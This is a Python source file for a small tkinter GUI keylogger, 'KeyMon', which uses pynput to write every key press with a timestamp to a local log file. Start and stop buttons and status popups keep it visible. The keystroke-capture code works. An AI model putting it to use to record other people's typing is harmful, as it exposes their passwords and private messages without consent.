import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import logging

# Set up logging to a file
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

class KeyMonApp:
    def __init__(self, root):
        self.root = root
        self.root.title("KeyMon - Simple Keylogger")
        
        self.status_label = tk.Label(root, text="Status: Stopped", fg="red", font=("Helvetica", 12))
        self.status_label.pack(pady=10)
        
        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger, bg="green", fg="white", font=("Helvetica", 12))
        self.start_button.pack(pady=5)
        
        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger, bg="red", fg="white", font=("Helvetica", 12))
        self.stop_button.pack(pady=5)
        
        self.listener = None
        self.running = False

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                logging.info(f"Key pressed: {key.char}")
            else:
                logging.info(f"Special key pressed: {key}")
        except Exception as e:
            logging.error(f"Error logging key press: {e}")
        print(f"Key pressed: {key}")  # Debug statement

    def start_keylogger(self):
        if not self.running:
            self.running = True
            self.status_label.config(text="Status: Running", fg="green")
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            logging.info("Keylogger started.")
            messagebox.showinfo("KeyMon", "Keylogger started successfully!")
        else:
            messagebox.showwarning("KeyMon", "Keylogger is already running.")
    
    def stop_keylogger(self):
        if self.running:
            self.listener.stop()
            self.running = False
            self.status_label.config(text="Status: Stopped", fg="red")
            logging.info("Keylogger stopped.")
            messagebox.showinfo("KeyMon", "Keylogger stopped successfully!")
        else:
            messagebox.showwarning("KeyMon", "Keylogger is not running.")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyMonApp(root)
    root.mainloop()
